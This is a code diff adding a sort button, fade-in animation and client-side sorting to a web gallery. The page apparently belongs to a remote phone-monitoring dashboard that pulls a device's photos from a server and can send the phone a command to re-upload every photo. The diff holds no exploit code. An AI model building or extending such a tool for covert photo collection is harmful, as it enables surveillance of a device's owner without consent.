@@ -15,6 +15,7 @@
             --primary-dark: #0284c7;
             --danger: #ef4444;
             --danger-dark: #b91c1c;
+            --warning: #f59e0b; /* Yellow for Sort */
             --text-main: #f1f5f9;
             --text-muted: #94a3b8;
         }
@@ -49,7 +50,7 @@
             background: rgba(30, 41, 59, 0.5);
             padding: 15px;
             border-radius: 50px;
-            max-width: 600px;
+            max-width: 800px; /* Thoda chouda kiya button ke liye */
             margin-left: auto; 
             margin-right: auto;
             backdrop-filter: blur(10px);
@@ -68,29 +69,21 @@
             box-shadow: 0 4px 12px rgba(0,0,0,0.2);
         }
 
-        /* Blue Button (Refresh/Download) */
-        .btn-primary {
-            background: linear-gradient(135deg, var(--primary), var(--primary-dark));
-            color: white;
-        }
+        /* Blue Button */
+        .btn-primary { background: linear-gradient(135deg, var(--primary), var(--primary-dark)); color: white; }
         .btn-primary:hover { transform: translateY(-2px); box-shadow: 0 6px 20px rgba(14, 165, 233, 0.4); }
 
-        /* Gray Button (Home) */
-        .btn-secondary {
-            background: #334155;
-            color: #cbd5e1;
-        }
+        /* Gray Button */
+        .btn-secondary { background: #334155; color: #cbd5e1; }
         .btn-secondary:hover { background: #475569; color: white; transform: translateY(-2px); }
 
-        /* Red Button (Reset History - Danger) */
-        .btn-danger {
-            background: linear-gradient(135deg, var(--danger), var(--danger-dark));
-            color: white;
-        }
-        .btn-danger:hover { 
-            transform: translateY(-2px); 
-            box-shadow: 0 6px 20px rgba(239, 68, 68, 0.4); 
-        }
+        /* Red Button */
+        .btn-danger { background: linear-gradient(135deg, var(--danger), var(--danger-dark)); color: white; }
+        .btn-danger:hover { transform: translateY(-2px); box-shadow: 0 6px 20px rgba(239, 68, 68, 0.4); }
+
+        /* 🔥 NEW: Yellow Sort Button */
+        .btn-warning { background: linear-gradient(135deg, #f59e0b, #d97706); color: white; }
+        .btn-warning:hover { transform: translateY(-2px); box-shadow: 0 6px 20px rgba(245, 158, 11, 0.4); }
 
         /* --- GALLERY GRID --- */
         .gallery-container {
@@ -110,7 +103,10 @@
             aspect-ratio: 1 / 1;
             cursor: pointer;
             transition: 0.3s;
+            animation: fadeIn 0.5s ease-in-out;
         }
+
+        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
 
         .gallery-img {
             width: 100%; height: 100%; object-fit: cover;
@@ -164,6 +160,10 @@
             <i class="fas fa-sync-alt"></i> Refresh
         </button>
 
+        <button id="sortBtn" class="btn btn-warning" onclick="toggleSort()">
+            <i class="fas fa-sort-amount-down"></i> Sort: Newest
+        </button>
+
         <button class="btn btn-danger" onclick="resetGalleryHistory()">
             <i class="fas fa-trash-restore"></i> Reset History
         </button>
@@ -192,10 +192,14 @@
     </div>
 
     <script>
-        const BASE_URL = "https://child-v9no.onrender.com"; // Server URL
+        const BASE_URL = "https://child-v9no.onrender.com"; 
         const urlParams = new URLSearchParams(window.location.search);
         const deviceId = urlParams.get('id');
         let nextCursor = null; 
+        
+        // 🔥 DATA HOLDER FOR SORTING
+        let allPhotos = [];         // Saari photos yahan store hongi
+        let isNewestFirst = true;   // Default sort order
 
         if (!deviceId) {
             document.getElementById('status').innerHTML = "<span style='color:var(--danger)'>❌ Error: Device ID Missing</span>";
@@ -206,12 +210,12 @@
         // --- 1. LOAD GALLERY FUNCTION ---
         function loadGallery(isLoadMore) {
             const status = document.getElementById('status');
-            const galleryDiv = document.getElementById('gallery');
             const loadMoreContainer = document.getElementById('loadMoreContainer');
             
             if (!isLoadMore) {
                 status.innerText = "⏳ Connecting to Secure Cloud...";
-                galleryDiv.innerHTML = ""; 
+                allPhotos = []; // Reset list agar fresh load hai
+                document.getElementById('gallery').innerHTML = ""; 
             } else {
                 status.innerText = "⏳ Loading more memories...";
             }
@@ -225,21 +229,13 @@
                 .then(response => response.json())
                 .then(data => {
                     if (data && data.photos && data.photos.length > 0) {
-                        status.innerHTML = `<span style='color:#4ade80'>✅ Gallery Updated (${data.photos.length} items)</span>`;
+                        status.innerHTML = `<span style='color:#4ade80'>✅ Gallery Updated (${allPhotos.length + data.photos.length} items)</span>`;
                         
-                        data.photos.forEach(imgUrl => {
-                            let itemDiv = document.createElement('div');
-                            itemDiv.className = 'gallery-item';
-                            
-                            let img = document.createElement('img');
-                            img.src = imgUrl; 
-                            img.className = "gallery-img";
-                            img.loading = "lazy"; 
-                            
-                            itemDiv.onclick = function() { openModal(imgUrl); };
-                            itemDiv.appendChild(img);
-                            galleryDiv.appendChild(itemDiv);
-                        });
+                        // Array mein naya data add karo
+                        data.photos.forEach(photo => allPhotos.push(photo));
+
+                        // HTML Render karo
+                        renderGallery();
 
                         nextCursor = data.next_cursor;
                         loadMoreContainer.style.display = nextCursor ? "block" : "none";
@@ -255,25 +251,61 @@
                 });
         }
 
-        // --- 2. 🔥 RESET HISTORY LOGIC (IMPORTANT) ---
+        // --- 🔥 2. RENDER GALLERY & SORTING LOGIC ---
+        function renderGallery() {
+            const galleryDiv = document.getElementById('gallery');
+            galleryDiv.innerHTML = ""; // Pehle clear karo
+
+            // Copy banake sort karo taki original data kharab na ho
+            let displayList = [...allPhotos];
+
+            // Agar user ne Oldest First manga hai to ulta kar do
+            if (!isNewestFirst) {
+                displayList.reverse();
+            }
+
+            // Loop chala ke HTML banao
+            displayList.forEach(imgUrl => {
+                let itemDiv = document.createElement('div');
+                itemDiv.className = 'gallery-item';
+                
+                let img = document.createElement('img');
+                img.src = imgUrl; 
+                img.className = "gallery-img";
+                img.loading = "lazy"; 
+                
+                itemDiv.onclick = function() { openModal(imgUrl); };
+                itemDiv.appendChild(img);
+                galleryDiv.appendChild(itemDiv);
+            });
+        }
+
+        function toggleSort() {
+            isNewestFirst = !isNewestFirst; // Switch True/False
+            const btn = document.getElementById('sortBtn');
+
+            if (isNewestFirst) {
+                btn.innerHTML = `<i class="fas fa-sort-amount-down"></i> Sort: Newest`;
+            } else {
+                btn.innerHTML = `<i class="fas fa-sort-amount-up"></i> Sort: Oldest`;
+            }
+
+            renderGallery(); // Wapas draw karo bina server call kiye
+        }
+
+        // --- 3. RESET HISTORY LOGIC ---
         function resetGalleryHistory() {
             if (!deviceId) return alert("Device ID not found!");
 
-            // Confirmation Alert
             if (!confirm("⚠️ WARNING: Isse phone ki 'Already Uploaded' history delete ho jayegi.\n\nIska matlab agli baar phone SAARI photos dobara upload karega.\n\nKya aap sure hain?")) {
                 return;
             }
 
-            // Button ko loading state mein daalo
             const btn = document.querySelector('.btn-danger');
             const originalText = btn.innerHTML;
             btn.innerHTML = `<i class="fas fa-spinner fa-spin"></i> Sending Command...`;
             btn.disabled = true;
 
-            // API Call to Server (Note: Aapko server pe route banana padega ya socket emit karna padega)
-            // Yahan hum manke chal rahe hain ki aapne /api/reset-gallery route banaya hai 
-            // jo internally socket.emit('reset_gallery') karta hai.
-            
             fetch(`${BASE_URL}/api/send-command`, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
@@ -288,7 +320,6 @@
             })
             .catch(err => {
                 alert("❌ Command Failed. Check Server Logs.");
-                console.error(err);
             })
             .finally(() => {
                 btn.innerHTML = originalText;
@@ -296,7 +327,7 @@
             });
         }
 
-        // --- 3. MODAL FUNCTIONS ---
+        // --- 4. MODAL FUNCTIONS ---
         function openModal(src) {
             const modal = document.getElementById('myModal');
             const modalImg = document.getElementById('img01');
